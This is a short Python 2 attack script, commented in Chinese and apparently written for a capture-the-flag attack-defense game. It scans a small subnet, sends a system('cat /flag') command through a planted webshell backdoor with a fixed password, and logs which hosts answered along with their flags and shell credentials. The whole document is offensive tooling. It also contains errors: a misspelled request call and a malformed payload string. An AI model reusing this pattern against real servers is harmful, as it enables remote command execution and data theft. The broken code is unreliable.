# 该脚本用于利用预留后门自动读flag，避免手动使用菜刀速度太慢的问题
# coding=utf-8
import requests
url = "http://192.168.12." #在一个C段
url1 = "" #用于遍历对手ip进行拼接
shell = "/upload/index.php"  #预留后门文件
passwd = "mima"
port = "80"
payload = {passwd:'system(\ 'cat /flag \');'}
f = open("webshell.txt","w")
f1 = open("first.txt","w")
for i in [1,2,3,4]: #由nmap探测得到的存活主机
    url1 = url+str(i)+":"+port+shell
    try:
        res = resquest.port(url1,payload,timeout=1)
        if res.status_code == requests.codes.ok:
            print url1+"connect success,flag is "+res.text
            print >> f1,url1+"connect success,flag is "+res.text
            print >> f,url1 + ","+passwd
        else:
            print "fail"
    except:
        print url1 + "connect fail"
f.close()
f1.close()